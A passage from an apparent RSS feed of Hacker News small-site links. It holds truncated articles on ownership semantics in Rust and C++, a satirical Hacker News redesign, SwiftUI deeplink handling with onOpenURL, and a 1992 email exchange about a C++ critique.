<p>Most traditional OOP languages are based around the concept of <em>inheritance</em>, a mechanism of deriving a class data type from another class data type and retaining similar information. Most people generally view inheritance as a combination of <a href="https://en.wikipedia.org/wiki/Subtyping">subtyping</a> and <a href="https://en.wikipedia.org/wiki/Dynamic_dispatch">dynamic dispatch</a> through <a href="https://en.wikipedia.org/wiki/Virtual_method_table">virtual method tables (vtables)</a>. This has lead to many discussions asking whether a language can be called as OOP if it does not support inheritance<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<p>In recent times, <em>inheritance</em> has been falling out of fashion in favour of <em>composition</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. This is mostly due to the issue of conforming a <em>class</em> to a strict (singular) hierarchy of agency when in reality, things can belong to many (if not infinite) categories and hierarchies, as well as another aspect which I will be discussing throughout this article.</p>
<p>There are many criticisms of OOP<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup><sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup><sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup><sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup><sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup><sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup> but my general criticism is that by placing emphasis on trying to solve problem in the type system, it shifts focus from the data structures and algorithms, <a href="https://www.gingerbill.org/article/2020/05/31/progamming-pragmatist-proverbs/#the-concept-of-programming">the core of what a program fundamentally is</a>.</p>
<p>Since objects themselves are being treated <em>as if</em> they have behaviour (not just type properties), they are effectively being treated as if they were <em>agents</em> in the program. This mental model has many conclusions, many of which cause issues.</p>
<p>In my article <a href="https://www.gingerbill.org/article/2020/05/31/progamming-pragmatist-proverbs/"><em>Pragmatism in Programming Proverbs</em></a>, I state:</p>
<blockquote>
<p>Object orientated programming is a form of misinterpreted and misapplied Aristotelian Metaphysics applied to a domain it was never meant to model</p>
</blockquote>
<p>What I mean by this statement is that <em>artificially</em> conforming any/all relationships between data and types to an artificial hierarchy of <em>agency</em> is a form of naïve-Aristotelian metaphysics. Since there is no actual <em>agency</em> in the programming objects, it is a partial fallacy. When trying to conform a program to have a particular structure when it does not naturally, the absence of a structure in a program is more useful than a bad structure.</p>
<h3 id="methods">Methods</h3>
<p>The concept of adding methods to classes/objects has proven useful to many. The real questions are:</p>
<ul>
<li>Why?</li>
<li>And how do people actually conceptualize methods on a day-to-day basis?</li>
</ul>
<p>For most people, I am going to bet that methods, in languages with an emphasis on inheritance rather than composition (such as C++ or Java), are treated as a way of categorizing and associating functions/procedures with a data record. There are a few reasons for this approach:</p>
<ul>
<li>Easy to organize and search for procedures by a data type</li>
<li>Allowing methods as a form of syntactic sugar for writing calls in a <em>subject verb object</em> manner e.g. <code>foo_do_thing(x, y)</code> vs <code>x.do_thing(y)</code></li>
<li>Mental model of behaviour for objects</li>
</ul>
<p>From experience, I have found that long time users of “OOP” languages eventually start treating methods primarily in the first two approaches.</p>
<p>I will not go into depth about the other main aspects of OOP such as encapsulation, local retention, forms of polymorphism, etc, as the hierarchical nature is the fundamental aspect of focus for this article. The (linear) hierarchy of agency is the main problem. The reason why people argue for <em>composition over inheritance</em> is that it flattens this linear hierarchy, reducing its effect. It is the transition from <a href="https://en.wikipedia.org/wiki/Nominal_type_system">nominal typing</a> to <a href="https://en.wikipedia.org/wiki/Structural_type_system">structural typing</a>, which is more flexible because many data structures and problems have a <em>non-linear</em> nature to them, which <em>linear</em> approaches <strong>cannot</strong> handle. When trying to adhere to the the strict hierarchical type system approaches, it leads to numerous issues because data is more commonly graph-like (non-linear) than tree-like (linear) for most problems. This strict hierarchy does occur with encapsulation at the object level too, a strict hierarchy of messages/references; this hierarchical nature arises from the concept agency itself, inheritance is not the root cause.</p>
<p><strong>n.b.</strong> Inheritance is not all bad and does have many real life practical uses, but these costs must be known before using them, like with any tool.</p>
<p><strong>n.b.</strong> The linearity is with regards to the data structures themselves and not the algorithms.</p>
<h2 id="foundations-of-the-ownership-semantics-paradigm">Foundations of the Ownership Semantics Paradigm</h2>
<p><a href="https://en.wikipedia.org/wiki/C%2B%2B">C++11</a> introduced the concept of <em>move semantics</em> or <em>ownership semantics</em> (OS), a way to minimize the copying of data through copy constructors. It utilizes the added concept of r-value references (<code>T &amp;&amp;</code>) as a means to do this. However, the concept began to be used for a lot more than its basic purpose. The concept adds the high level abstraction of “moving” objects rather than “copying” objects. Physically, a computer only ever copies and this high level abstraction, to treat objects <em>as if</em> they were “real objects”, is not what actually happens. It is also a <a href="https://en.wikipedia.org/wiki/Category_mistake">category error</a> to treat them as “real objects” since “real objects” and “programming objects” have little connection with each other ontologically. When a value or object is “moved”, this means is that the <em>responsibilities</em> of the resources of that object have been transferred to another object or environment—<em>agents</em>. In this case, ownership/move semantics is fundamentally based around the <em>responsibilities of values</em> by tracking value usage.</p>
<p>In this model of agency, the arena of agency can take on many forms, such as blocks, procedure bodies, or aggregate values. Therefore some <em>owned-values</em> also <em>own</em> other values, and thus a value could have agency.</p>
<p>If we were to call Ownership Semantics a paradigm, it would be the orientation around the <em>responsibility of values</em> in a hierarchical fashion, placing emphasis on this system of responsibility, shifting focus from data structures and algorithms.</p>
<p>The concept of <em>responsibility</em> and <em>ownership</em> is similar to the real world counter parts in that to own something means to have exclusive use and full responsibility over it.</p>
<p><a href="https://www.rust-lang.org/">Rust</a> is a multi-paradigm programming language but at its core is an Ownership-Orientated language. Everything in Rust has a concept of <em>“ownership”</em> and <em>lifetime</em> associated with it. Rust is designed around trying to be first and foremost “safe”, especially with regards to concurrency. Rust derives from the C++ family in terms of philosophy and style, but uses a more <a href="https://www.gingerbill.org/article/2018/03/12/on-the-aesthetics-of-the-syntax-of-declarations/">qualifier-focused</a> declaration syntax and many concepts from functional languages from the <a href="https://en.wikipedia.org/wiki/ML_%28programming_language%29">ML family</a>.</p>
<p><em>Lifetimes</em> are theoretically orthogonal to <em>ownership</em> but in practical, they usually are intrinsically coupled. I will not discuss the problems with object-based lifetimes in this article.</p>
<p>The following Rust code can be used to demonstrate this responsibility transfer between different capturing things such as <code>let</code> statements:</p>
<pre><code>pub struct Foo {
	value: i32,
}

fn main() {
	let foo = Foo{value: 123};
	let bar = foo; // the responsibility of `foo` is transferred to `bar`

	println!("{}", foo.value); // error: use of moved value: `foo.value`
	println!("{}", bar.value);
}

</code></pre>
<p>Rust is an immutable-by-default language, with the option to opt into mutability with <code>mut</code>. Immutability helps a lot with mathematical proofs for logic since things things can be “flattened” quite easily, however virtually all computers are fundamentally mutable things, even if the abstraction of immutability is a useful tool. As a result, the ownership semantics system requires a few more rules to take into account mutability, by adding the concept of “borrowing” through references. The general rules for the borrow checker are:</p>
<ul>
<li>Each value may have as many immutable borrows as you want</li>
<li>Each value may only have one mutable borrow at a time</li>
<li>Each value may not borrow immutably and mutably at the same time</li>
<li>Values will be “dropped” when the owning connecting goes out of scope</li>
<li>Taking a value by <code>self</code> <code>Drop</code>s the original value</li>
</ul>
<p>When using Rust (or move semantics to their full extent in C++11), most people will fight the borrow …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gingerbill.org/article/2020/06/21/the-ownership-semantics-flaw/">https://www.gingerbill.org/article/2020/06/21/the-ownership-semantics-flaw/</a></em></p>]]>
            </description>
            <link>https://www.gingerbill.org/article/2020/06/21/the-ownership-semantics-flaw/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745863</guid>
            <pubDate>Mon, 06 Jul 2020 08:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker News Design Is Ugly]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23745595">thread link</a>) | @neilpanchal
<br/>
July 6, 2020 | https://neil.computer/notes/hacker-news-design-is-ugly/ | <a href="https://web.archive.org/web/*/https://neil.computer/notes/hacker-news-design-is-ugly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
        <h2>Hacker News Design is Ugly</h2>
        <p>This thing is straight up ugly. It is too simple, useful, pragmatic, dense and practical. Boring. These days the cool things are purple gradients, lots of negative space and loss of contrast. People on HN keep <a href="https://news.ycombinator.com/item?id=23199603">raving</a> about this design thing but boy they are so wrong.</p><p>Let's fix it.</p><h2 id="current-state">Current State</h2><p>This is what HN front-page looks like when you login. It has absolutely zero pop. Typical engineers, what do they know about design?</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.35.01-PM.png" alt="" width="1938" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.35.01-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.35.01-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.35.01-PM.png 1600w, https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.35.01-PM.png 1938w" sizes="(min-width: 720px) 720px"></figure><p>Let's make it pop, shall we?</p><h2 id="fixing-hn-design">Fixing HN Design</h2><p>First things first. <em>Padding</em>. When I am bored, running out of ideas, I like to do one thing that usually makes things 10x better. Padding is like a chef's knife in the kitchen. Know how to use it well and you'll be cutting through information rich UI like butter. It is what sets professional designers from these gray-beard types.</p><p>It is difficult to do it right, so please allow me to exemplify the process. First, add padding to the <code>body</code> tag.</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.35.35-PM.png" alt="" width="1938" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.35.35-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.35.35-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.35.35-PM.png 1600w, https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.35.35-PM.png 1938w" sizes="(min-width: 720px) 720px"></figure><p>See the difference? Holy crap. The UI just suddenly started <em>breathing</em>.</p><p>Let's add more spacing between this conjested highly dense information rich piece of shit.</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.37.35-PM.png" alt="" width="1938" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.37.35-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.37.35-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.37.35-PM.png 1600w, https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.37.35-PM.png 1938w" sizes="(min-width: 720px) 720px"></figure><p>The color orange is fine with me but it is not gonna get you through the design school and into the real world. The world today demands magenta. Magenta/Purple/Cyan all inspired by Stripe UI since 2015 or so and it really set the standard for a modern color palette. Throw your creativity and objectivity away, the trend dictates what we should choose<em>.</em> May be it PANTONE will come up with a <a href="https://www.pantone.com/color-intelligence/color-of-the-year/color-of-the-year-2020">color of the year</a> and it will change. But as per current design trends, purple is the safe choice.</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.53.20-PM.png" alt="" width="2598" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.53.20-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.53.20-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.53.20-PM.png 1600w, https://neil.computer/content/images/size/w2400/2020/07/Screen-Shot-2020-07-05-at-11.53.20-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>BAM. What you didn't notice is I also got rid of all background colors to flatten things a bit. I hate borders which are a graphical device invented to create logical spatial layouts but those things are for boring websites for techy folks.</p><p>Next up. Pro tip: Border-radius. It is not as complicated as it sounds. Simply put, we like to make things rounded as allows us to compete for a one of those web design <a href="https://www.awwwards.com/">awwwards</a> and border-radius is a mandatory requirement before creating a <a href="https://dribbble.com/">dribbble</a> account. So we must comply without the thought of originality.</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.54.51-PM.png" alt="" width="2598" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.54.51-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.54.51-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.54.51-PM.png 1600w, https://neil.computer/content/images/size/w2400/2020/07/Screen-Shot-2020-07-05-at-11.54.51-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>See? It really ties the web page together.</p><p>Those pesky informative sub-titles are jarring as it helps the user too much. Let's make it so that it loses contrast and fades away in the background. As a side effect, it makes the whole thing more minimal. Minimalism at all costs. Try to make things minimal by removing features and neutring functionality - no one will ever notice. </p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-05-at-11.55.33-PM.png" alt="" width="2598" height="2254" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-05-at-11.55.33-PM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-05-at-11.55.33-PM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-05-at-11.55.33-PM.png 1600w, https://neil.computer/content/images/size/w2400/2020/07/Screen-Shot-2020-07-05-at-11.55.33-PM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It looks minimal af.</p><p>That's all folks. Hacker News redesigned. These are the basics but if there is enough interest, I can probably make another tutorial on how to do <em>this</em>:</p><figure><img src="https://neil.computer/content/images/2020/07/Screen-Shot-2020-07-06-at-12.05.17-AM.png" alt="" width="2510" height="2166" srcset="https://neil.computer/content/images/size/w600/2020/07/Screen-Shot-2020-07-06-at-12.05.17-AM.png 600w, https://neil.computer/content/images/size/w1000/2020/07/Screen-Shot-2020-07-06-at-12.05.17-AM.png 1000w, https://neil.computer/content/images/size/w1600/2020/07/Screen-Shot-2020-07-06-at-12.05.17-AM.png 1600w, https://neil.computer/content/images/size/w2400/2020/07/Screen-Shot-2020-07-06-at-12.05.17-AM.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Until then, go here and browse some more trends to follow at the cost of authenticity, objectivity, originality, reasoning and fundamental understanding of how to design user interfaces: <a href="https://www.google.com/search?q=design+trends+2020">https://www.google.com/search?q=design+trends+2020</a></p>
        </article>
</div></div>]]>
            </description>
            <link>https://neil.computer/notes/hacker-news-design-is-ugly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745595</guid>
            <pubDate>Mon, 06 Jul 2020 07:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handling deeplinks in iOS 14 and SwiftUI 2.0 with onOpenURL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745576">thread link</a>) | @dwltz
<br/>
July 6, 2020 | https://www.donnywals.com/handling-deeplinks-in-ios-14-with-onopenurl/ | <a href="https://web.archive.org/web/*/https://www.donnywals.com/handling-deeplinks-in-ios-14-with-onopenurl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This article covers beta technology and it's up to date for Xcode 12 beta 1</p></blockquote><p>Starting with iOS 14, we can write apps that are fully built using SwiftUI, dropping the need to have <code>AppDelegate</code> and <code>SceneDelegate</code> files entirely. For as long as I remember, I've <a href="https://www.donnywals.com/handling-deeplinks-in-your-app/">handled deeplinks</a> in my <code>AppDelegate</code> and for the past year in the <code>SceneDelegate</code>. So when Apple introduced developers to this new <code>@main</code> annotated <code>App</code> struct style of building apps, I'm sure we all had the same question on our mind. How does the new <code>App</code> struct work with deeplinks and other tasks that are normally performed in the <code>AppDelegate</code>?</p><p>Luckily, Apple engineers made sure that handling deeplinks in our apps is still possible with the new <code>onOpenURL(perform:)</code> view modifier.</p><h2>Handling deeplinks with onOpenURL</h2><p>The new <code>onOpenURL(perform:)</code> view modifier is new in iOS 14. It allows developers to register a URL handler on their views so they can respond to URLs by modifying state for their views as needed.</p><p>This is vastly different from how we're used to dealing with URLs in UIKit and the <code>SceneDelegate</code> flow.</p><p>The old way of handling deeplinks requires you to handle each link in the <code>SceneDelegate</code> (or <code>AppDelegate</code>). You would have to manipulate the selected tab in a <code>UITabBarViewController</code>, or present a <code>UIViewController</code> by inspecting the current view controller hierarchy and pushing the needed <code>UIViewController</code> from right inside of the <code>SceneDelegate</code>.</p><p>In SwiftUI, you can use the <code>onOpenURL(perform:)</code> on the root of your scene as follows:</p><pre><code>@main
struct MyApplication: App {
  var body: some Scene {
    WindowGroup {
      ContentView()
        .onOpenURL { url in
          // handle the URL that must be opened
        }
    }
  }
}</code></pre><p>I will cover what it means exactly to handle the url in the next section of this article, but usually it will involve mutating some state to load and display the view associated with the URL that must be opened.</p><p>What's really neat is that you can specify multiple <code>onOpenURL</code> handlers throughout your app. This means that you can make multiple, smaller changes to your app state which means that you no longer have one place where all of your deeplink handling and view manipulation takes place.</p><p>Furthermore, <code>onOpenURL</code> is called when your app is in the foreground, background or not running at all. This means that there is now a single entry point for your app to handle URLs. Even if your app is relaunched after being force-closed.</p><p>In the next section, I will show you an example of how you can select a tab in a <code>TabView</code> depending on the URL that your app is requested to open. After that, I will show you how to navigate to a list item in a view that's embedded in a <code>TabView</code> by adding a second <code>onOpenURL</code> view modifier on a child <code>View</code> that contains a <code>List</code>.</p><h2>Activating a tab in a TabView when opening a URL</h2><p>In SwiftUI, views are a function of their state. This means that virtually everything in a SwiftUI application can be represented and manipulated as a data model. This means that we can represent the currently selected tab in a SwiftUI <code>TabView</code> as a property on an <code>App</code> struct.</p><p>The following code shows how:</p><pre><code>struct MyApplication: App {
  @State var activeTab = 0

  var body: some Scene {
    WindowGroup {
      TabView(selection: $activeTab) {
        HomeView()
          .tabItem {
            VStack {
              Image(systemName: "house")
              Text("Home")
            }
          }
          .tag(0)

        SettingsView()
          .tabItem {
            VStack {
              Image(systemName: "gearshape")
              Text("Settings")
            }
          }
          .tag(1)
      }
      .onOpenURL { url in
        // determine which tab should be selected and update activeTab
      }
    }
  }
}</code></pre><p>What's important to notice here is the <code>activeTab</code> property. This property is marked as <code>@State</code> and represents the selected tab in the <code>TabView</code>. When creating the <code>TabView</code>, I pass a binding to <code>activeTab</code> to the <code>TabView</code>'s initializer. Setting the <code>TabView</code> up like this means that updating <code>activeTab</code> will cause the <code>TabView</code> to update its selected tab as well.</p><p>Notice that I set a <code>tag</code> on the views that are added to the <code>TabView</code>. This <code>tag</code> is used to identify the <code>TabView</code>'s items. When <code>activeTab</code> matches one of the <code>tag</code>s associated with your views, the <code>TabView</code> will activate the matching tab.</p><p>In this case that means setting <code>activeTab</code> to <code>1</code> would activate the tab that displays <code>SettingsView</code>.</p><p>Let's see how you can implement <code>onOpenURL</code> to figure out and activate the correct tab. To do this, I'm going to introduce an extension on <code>URL</code>, and a new type called <code>TabIdentifier</code>:</p><pre><code>enum TabIdentifier: Hashable {
  case home, settings
}

extension URL {
  var isDeeplink: Bool {
    return scheme == "my-url-scheme" // matches my-url-scheme://&lt;rest-of-the-url&gt;
  }

  var tabIdentifier: TabIdentifier? {
    guard isDeeplink else { return nil }

    switch host {
    case "home": return .home // matches my-url-scheme://home/
    case "settings": return .settings // matches my-url-scheme://settings/
    default: return nil
    }
  }
}</code></pre><p>The code above is just a convient way to figure out which tab belongs to a <code>URL</code> without having to duplicate logic all over the app. If you decide to implement a similar object, the <code>isDeeplink</code> computed property should be updated according to the URLs you want to support. If you're implementing Universal Links, you'll want to check whether the <code>URL</code>'s <code>host</code> property matches your hostname. I've set up a very minimal check here for demonstration purposes where I only care about the URL scheme.</p><p>The <code>tabIdentifier</code> property is a computed property that uses the <code>host</code> property to determine which tab should be selected. For a Universal Link you'll probably want to use the <code>pathComponents</code> property and compare using the second entry in that array, depending on your mapping strategy. Again, I set this up to be very basic.</p><p>You can use this basic setup in the <code>App</code> struct as follows:</p><pre><code>struct MyApplication: App {
  @State var activeTab = TabIdentifier.home

  var body: some Scene {
    WindowGroup {
      TabView(selection: $activeTab) {
        HomeView()
          .tabItem {
            VStack {
              Image(systemName: "house")
              Text("Home")
            }
          }
          .tag(TabIdentifier.home) // use enum case as tag

        SettingsView()
          .tabItem {
            VStack {
              Image(systemName: "gearshape")
              Text("Settings")
            }
          }
          .tag(TabIdentifier.settings) // use enum case as tag
      }
      .onOpenURL { url in
        guard let tabIdentifier = url.tabIdentifier else {
          return
        }

        activeTab = tabIdentifier
      }
    }
  }
}</code></pre><p>Because I made <code>TabIdentifier</code> <code>Hashable</code>, it can be used as the <code>activeTab</code> identifier. Each tab in the <code>TabView</code> is associated with a <code>TabIdentifier</code> through their tags, and by reading the new <code>tabIdentifier</code> that I added to <code>URL</code> in my extension, I can easily extract the appropriate tab identifier associated with the URL that I need to open.</p><p>As soon as I assign the acquired <code>tabIdentifier</code> to <code>activeTab</code>, the <code>TabView</code> is updated marking the appropriate tab as selected along with displaying the appropriate <code>View</code>.</p><p>Of course this is only half of what you'll want to typically do when opening a deeplink. Let's take a look at activating a <code>NavigationLink</code> in a different view next.</p><h2>Handling a URL by activating the correct NavigationLink in a List</h2><p>You already know how to activate a tab in a <code>TabView</code> when your app needs to handle a URL. Often you'll also need to navigate to a specific detail page in the view that's shown for the selected tab item. The cleanest way I have found to do this, is by adding a second <code>onOpenURL</code> handler that's defined within the detail view that should activate your navigation link.</p><p>When you define multiple <code>onOpenURL</code> handlers, the system will call them all, allowing you to make small, local changes to your view's data model. Like selecting a tab in the <code>App</code> struct, and activating a <code>NavigationLink</code> in a child view. Before I show you how to do this, We'll need another extension on <code>URL</code> to extract the information we need to activate the appropriate <code>NavigationLink</code> in a <code>List</code>:</p><pre><code>enum PageIdentifier: Hashable {
  case todoItem(id: UUID)
}

extension URL {
  var detailPage: PageIdentifier? {
    guard let tabIdentifier = tabIdentifier,
          pathComponents.count &gt; 1,
          let uuid = UUID(uuidString: pathComponents[1]) else {
      return nil
    }

    switch tabIdentifier {
    case .home: return .todoItem(id: uuid) // matches my-url-scheme://home/&lt;item-uuid-here&gt;/
    default: return nil
    }
  }
}</code></pre><p>I've added a new enum called <code>PageIdentifier</code>. This enum has a single case with an associated value. This associated value represents the identifier of the object that I want to deeplink to. My app is a to-do app, and each to-do item uses a <code>UUID</code> as its unique identifier. This is also the identifier that's used in the deeplink. The approach above is similar to what I've shown in the previous section and if you decide you like my URL parsing approach, you'll have to make some modifications to adapt it in your app.</p><p>The next step is to implement the <code>HomeView</code>, and select the appropriate item from its list of items:</p><pre><code>struct HomeView: View {
  @StateObject var todoItems = TodoItem.defaultList // this is just a placeholder.  
  @State var activeUUID: UUID?

  var body: some View {
    NavigationView {
      List(todoItems) { todoItem in
        NavigationLink(destination: TodoDetailView(item: todoItem), tag: todoItem.id, selection: $activeUUID) {
          TaskListItem(task: todoItem)
        }
      }
      .navigationTitle(Text("Home"))
      .onOpenURL { url in
        if case .todoItem(let id) = url.detailPage {
          activeUUID = id
        }
      }
    }
  }
}</code></pre><p>Notice that my <code>HomeView</code> has a property called <code>activeUUID</code>. This property serves the exact same purpose that <code>activeTab</code> fulfilled in the previous section. It represents the identifier for the item that should be selected.</p><p>When creating my <code>Navigat…</code></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.donnywals.com/handling-deeplinks-in-ios-14-with-onopenurl/">https://www.donnywals.com/handling-deeplinks-in-ios-14-with-onopenurl/</a></em></p>]]>
            </description>
            <link>https://www.donnywals.com/handling-deeplinks-in-ios-14-with-onopenurl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745576</guid>
            <pubDate>Mon, 06 Jul 2020 07:37:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C++?? A Critique of C++ (1992)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745291">thread link</a>) | @alexeiz
<br/>
July 5, 2020 | https://www.modulaware.com/mdlt28.htm | <a href="https://web.archive.org/web/*/https://www.modulaware.com/mdlt28.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div face="Arial">
<hr>
<h3>The ModulaTor's Forum</h3>
<p>
Subject: Re: C++?? A C++ Critique
<br>From: Guenter Dotzel
<br>To: Ian Joyner &gt;INTERNET: ian@syacus.acus.oz.au
</p><p>
Ian, 
</p><p>
I'm concerned about the recent popularization of both C and C++. Either one of 
these languages seems to be pervasive when talking about a programming 
language. 
</p><p>
I enjoyed reading your article entitled "C++?? A C++ Critique" dated Nov-1992. 
Your article seems to clarify most aspects and rumors about C++. 
</p><p>
According to Prof. Gutknecht from ETH-Zuerich, who talked about the Tragedy 
of Programming Language Development at the 2nd European Modula-2 
Conference, Leicester/UK, Sep-1992, the main features that made C++ "the 
definite programming languages" are: 
</p><p>
C++ supports several programming paradigms and blends, gives access to all 
[abstraction] levels and encuroage breaks of abstraction, is not dangerous 
powerful, is a tricky and challenging game and has completely lost its identity. 
</p><p>
I think your article could help the not so programming language design sensitive 
average application programmers to get a feeling what C++ is all about. I 
assume that even Modula-2 and Oberon-2 programmers would be interested in 
reading your article to find some arguments against C++. I know that they often 
get asked Why don't you switch to modern, popular, high-level, OO-languages 
such as C++? 
</p><p>
As the editor of our monthly, non-commercial, pure-technical, Modula-2 and 
Oberon-2 related newsletter called The ModulaTor, I'd like to ask you for 
permission to publish your article in an upcoming issue of this newsletter. 
</p><p>
Greetings, Guenter 
</p><p>
From: ian@syacus.acus.oz.au
<br>Subject: Re: C++?? A C++ Critique
<br>To: 100023.2527@compuserve.com
<br>Date: Wed, 18 Nov 92 12:16:32 EST
</p><p>
Dear Guenter, 
</p><p>
I would be very pleased for you to publish the second edition of my article. 
Thanks for thinking of it. 
</p><p>
As for C++ being a modern language rather than Modula-2 of Oberon, the 
reverse is the case. I find it depressing to think that we are now stuck with a 
language full of compromises that were made for small machines of 25 years 
ago. The Algol style languages, and Pascal forward were designed to be much 
less technology dependent, and so are still relevant today. 
</p><p>
Anyway I think that those who have suffered C silently in the past are now 
finding a voice to be able to counter the criticism and arrogance of the C world to 
view all other languages as second rate, and old. I hope you find the critique 
useful and interesting. If so, please feel free to distribute it among your peers 
and friends. 
</p><p>
[Ed. note: additional notes received from Ian in Jun-1995 via Ruslan, a friend at 
IUE, Moscow:] 
</p><hr>
<p>
C++ is a language that is coming under ever more intense criticism. Bjarne 
Stroustrup finds this unfair, as he says the language delivers what they set out 
to do. However, C++ is a poor implementation of OO technology, and its 
shortcomings need to be criticised. One critique of C++ is my own C++?? 
Critique. 
</p><p>
Another appraisal of C++ as compared to Eiffel is in Richard Wiener's "Software 
Development using Eiffel: There can be life other than C++" (Prentice Hall), a 
very even handed treatment of the subject. 
</p><p>
Undoubtedly, one person who has set the watermark for OO technology is 
Bertrand Meyer, the creator of Eiffel. He has written several books describing 
object technology which should be read. He pulls no punches in his criticism of 
C++. The recommended <i>Bertrand Meyer</i> reading is 
<a href="http://www.amazon.com/exec/obidos/ASIN/0136291554/modulaware">
"Object-oriented Software Construction"</a>, 2nd edition, 1995,
and 
<a href="http://www.amazon.com/exec/obidos/ASIN/0131928333/modulaware">
"Object Success: A Managers guide to object orientation, 
its impact on the corporation and its use for 
reengineering the software process"</a>.
Both books Prentice Hall. 
</p><p>
I believe that Object-oriented technology has a lot to offer in helping with the 
problems faced by modern and complex software systems. However, to many 
object-oriented people, C++ is the biggest disappointment of all, bringing all the 
bad old ways and a lot of unnecessary complexity to object-orientation. You do 
not need a language so riddled with low level constructs. The correct way is to 
use a pure OO language, and only interface to C, or other low level languages 
through external mechanisms. That way will ensure maintainability, portability, 
and quality. 
</p><p>
I wish you success in your quest for building quality software cost effectively, 
and I think you will find part of the answer to the goal in Object-orientation, but 
not in C++. Critics of C++ are not religious fanatics and cranks as many C++ 
proponents would make out. We realise the shortcomings of C++, and advise 
looking into some of the better ways that are available. 
</p><hr>
Several sites have offered to make the C++?? Critique available by ftp. I would 
like to thank Indiana University, University of Western Australia, Brown 
University and IRISA/CNRS France for their help, and many other sites who 
have done this voluntarily without solicitation. The sites that I know about who 
have given me permission to advertise their service are: 
<pre>U.S West Indiana University:

      Machine:       moose.cs.indiana.edu
      IP #           129.79.254.191
      Directory:     pub
      Compressed:    cpp.crit/cpp.crit.ps.Z
      Hours:         After 6pm Eastern US Please

Australia/Asia University of Western Australia:

      Machine:       redback.cs.uwa.edu.au
      IP #           130.95.80.61
      Directory:     /Others/Quinn
      File:          c++.ps.Z
      Please read:   /ComSci/ReadMeAboutRedback

U.S East Brown University:

      Machine:       ftp.brown.edu
      Directory:     /pub/c++
      File:          C++-Critique-2ed.PS

France/Europe IRISA/CNRS:

      Machine:       irisa.irisa.fr
      IP #           131.254.254.2
      Directory:     pub/c++
      File:          cpp.crit.ps.Z
</pre>
<p>
Please observe Indiana's after hours embargo, as they have offered to do this 
completely voluntarily. 
</p><p>
Please report any problems to ian@syacus.acus.oz.au. Thank you. Also, if you 
need text or uncompressed postscript, please contact me directly. 
</p><p>
I hope you find the critique useful and interesting. If so, please feel free to 
distribute it among your peers and friends. 
</p><p>
Printing problems? 
</p><p>
If you find the file does not print, you might find that the control D (^D or EOT) as 
the first character in the file is upsetting your printer. Some printers seems to 
require this, and others don't. Just remove it if you have a problem. 
</p><p>
If there are carriage returns that your printer objects to remove all ^M 
characters. 
</p><p>
